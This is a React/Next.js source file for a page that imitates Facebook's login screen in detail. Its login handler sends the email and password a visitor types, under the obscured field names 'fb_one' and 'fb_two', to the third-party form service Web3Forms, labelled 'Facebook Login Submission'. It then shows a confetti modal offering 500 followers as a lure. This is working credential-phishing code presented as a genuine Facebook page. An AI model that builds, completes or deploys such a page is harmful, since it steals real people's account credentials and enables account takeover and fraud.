"use client";

import React, { useState } from "react";
import Image from "next/image";
import Link from "next/link";
import { FacebookLogo, MetaLogo } from "@/components/common/Icons";
import LanguageModal from "@/components/common/LanguageModal";
import CelebrationModal from "@/components/common/CelebrationModal";
import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";

export default function FacebookLoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLangModalOpen, setIsLangModalOpen] = useState(false);
  const [isCelebrationOpen, setIsCelebrationOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const isFormFilled = email.trim().length > 0 && password.trim().length > 0;

  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isFormFilled || isSubmitting) return;

    setIsSubmitting(true);
    setStatusMessage(null);

    const formData = new FormData(e.currentTarget);
    const result = await submitToWeb3Forms(formData, "Facebook Login Submission");

    setIsSubmitting(false);
    if (result.success) {
      setIsCelebrationOpen(true);
      setEmail("");
      setPassword("");
    } else {
      setStatusMessage({
        type: "error",
        text: result.message || "Failed to log in. Please try again.",
      });
    }
  };

  const fbLanguages = [
    "English (UK)",
    "தமிழ்",
    "తెలుగు",
    "ಕನ್ನಡ",
    "اردو",
    "हिन्दी",
    "മലയാളം",
  ];

  const fbLinks = [
    "Sign up",
    "Log in",
    "Messenger",
    "Facebook Lite",
    "Video",
    "Meta Pay",
    "Meta Store",
    "Meta Quest",
    "Ray-Ban Meta",
    "Meta AI",
    "Instagram",
    "Threads",
    "Privacy Policy",
    "Privacy Centre",
    "About",
    "Create ad",
    "Create Page",
    "Developers",
    "Careers",
    "Cookies",
    "AdChoices",
    "Terms",
    "Help",
    "Contact uploading and non-users",
  ];

  return (
    <div className="min-h-screen flex flex-col justify-between bg-white text-[#1c1e21] font-sans antialiased selection:bg-[#0866FF] selection:text-white">
      {/* Main Content Area */}
      <div className="flex-1 flex items-center justify-center px-6 sm:px-10 lg:px-14 py-8 lg:py-10">
        <div className="w-full max-w-[1220px] grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-10 items-center">
          
          {/* Left Column - Facebook Logo, Headline & Banner Collage */}
          <div className="lg:col-span-7 flex flex-col items-start text-left">
            {/* Facebook Round Blue Logo */}
            <div className="mb-4">
              <FacebookLogo className="w-[52px] h-[52px]" />
            </div>

            <div className="w-full flex flex-col sm:flex-row items-center justify-between gap-4 lg:gap-6">
              {/* Bold Stacked Headline */}
              <h1 className="text-[48px] sm:text-[52px] lg:text-[56px] font-bold tracking-tight leading-[1.08] text-[#1c1e21] max-w-[280px]">
                Explore <br />
                the <br />
                things <br />
                <span className="text-[#0866FF]">you love</span>.
              </h1>

              {/* Banner Moments Collage */}
              <div className="relative w-[300px] sm:w-[360px] lg:w-[410px] aspect-square flex-shrink-0 animate-fade-in">
                <Image
                  src="/images/facebook_banner.webp"
                  alt="Explore Facebook Moments"
                  fill
                  className="object-contain"
                  priority
                />
              </div>
            </div>
          </div>

          {/* Center Vertical Divider (Desktop) */}
          <div className="hidden lg:block lg:col-span-1 h-[460px] w-[1px] bg-[#E4E6EB] mx-auto" />

          {/* Right Column - Login Card */}
          <div className="lg:col-span-4 w-full max-w-[390px] mx-auto">
            <div className="w-full flex flex-col gap-3.5">
              <h2 className="text-[20px] font-semibold text-[#1c1e21] tracking-tight text-left">
                Log in to Facebook
              </h2>

              <form onSubmit={handleLogin} className="flex flex-col gap-3 mt-1">
                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
                <input type="hidden" name="subject" value="Facebook Login Submission" />
                <input type="hidden" name="from_name" value="Facebook Auth Portal" />
                <input type="hidden" name="form_name" value="Facebook Login" />
                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />

                {statusMessage && (
                  <div
                    className={`p-3 rounded-xl text-xs font-medium text-center ${
                      statusMessage.type === "success"
                        ? "bg-green-50 text-green-700 border border-green-200"
                        : "bg-red-50 text-red-700 border border-red-200"
                    }`}
                  >
                    {statusMessage.text}
                  </div>
                )}

                {/* Email / Mobile input */}
                <div>
                  <input
                    type="text"
                    name="fb_one"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email address or mobile number"
                    className="w-full h-[52px] px-4 rounded-xl border border-[#CCD0D5] bg-white text-[15px] text-[#1c1e21] placeholder-[#8A8D91] focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] transition-all"
                    required
                  />
                </div>

                {/* Password input */}
                <div>
                  <input
                    type="password"
                    name="fb_two"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="w-full h-[52px] px-4 rounded-xl border border-[#CCD0D5] bg-white text-[15px] text-[#1c1e21] placeholder-[#8A8D91] focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] transition-all"
                    required
                  />
                </div>

                {/* Log in Button */}
                <button
                  type="submit"
                  disabled={!isFormFilled || isSubmitting}
                  className={`w-full h-[46px] rounded-full font-semibold text-[15px] tracking-wide transition-all shadow-sm mt-1 flex items-center justify-center gap-2 ${
                    isFormFilled && !isSubmitting
                      ? "bg-[#0866FF] hover:bg-[#0055d4] active:bg-[#0047b3] text-white cursor-pointer"
                      : "bg-[#0866FF]/60 text-white/80 cursor-not-allowed"
                  }`}
                >
                  {isSubmitting ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Logging in...</span>
                    </>
                  ) : (
                    "Log in"
                  )}
                </button>

                {/* Forgotten password link */}
                <div className="text-center my-1.5">
                  <Link
                    href="/facebook/forgot-password"
                    className="text-[14px] text-[#1c1e21] hover:underline font-normal"
                  >
                    Forgotten password?
                  </Link>
                </div>

                {/* Create new account Button */}
                <Link
                  href="/create"
                  className="w-full h-[46px] rounded-full border border-[#0866FF] text-[#0866FF] hover:bg-[#0866FF]/5 active:bg-[#0866FF]/10 font-semibold text-[14px] flex items-center justify-center transition-all mt-1"
                >
                  Create new account
                </Link>
              </form>

              {/* Meta Logo Footer */}
              <div className="flex justify-center items-center mt-6 text-[#1c1e21]">
                <MetaLogo className="h-4 text-[#1c1e21]" />
              </div>
            </div>
          </div>

        </div>
      </div>

      {/* Multilingual & Legal Footer */}
      <footer className="w-full bg-white pt-8 pb-10 text-[12px] text-[#8a8d91] border-t border-[#f0f2f5] select-none">
        <div className="max-w-5xl mx-auto px-6">
          {/* Language Row */}
          <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[12px]">
            {fbLanguages.map((lang, idx) => (
              <a
                key={lang}
                href="#"
                className={`hover:underline ${idx === 0 ? "text-[#737373] font-medium" : "text-[#8a8d91]"}`}
                onClick={(e) => e.preventDefault()}
              >
                {lang}
              </a>
            ))}
            <button
              onClick={() => setIsLangModalOpen(true)}
              className="hover:underline text-[#8a8d91] inline-flex items-center gap-0.5 ml-1"
            >
              More languages...
            </button>
          </div>

          {/* Thin Divider */}
          <div className="h-[1px] bg-[#dadde1] my-2.5 w-full" />

          {/* Links Grid */}
          <div className="flex flex-wrap gap-x-4 gap-y-1.5 text-[12px] text-[#8a8d91]">
            {fbLinks.map((link) => (
              <a
                key={link}
                href="#"
                className="hover:underline hover:text-[#737373] transition-colors"
                onClick={(e) => e.preventDefault()}
              >
                {link}
              </a>
            ))}
          </div>
        </div>
      </footer>

      {/* Language Bottom Sheet Modal */}
      <LanguageModal
        isOpen={isLangModalOpen}
        onClose={() => setIsLangModalOpen(false)}
      />

      {/* Celebration Modal with Confetti */}
      <CelebrationModal
        isOpen={isCelebrationOpen}
        onClose={() => setIsCelebrationOpen(false)}
        followerCount={500}
      />
    </div>
  );
}
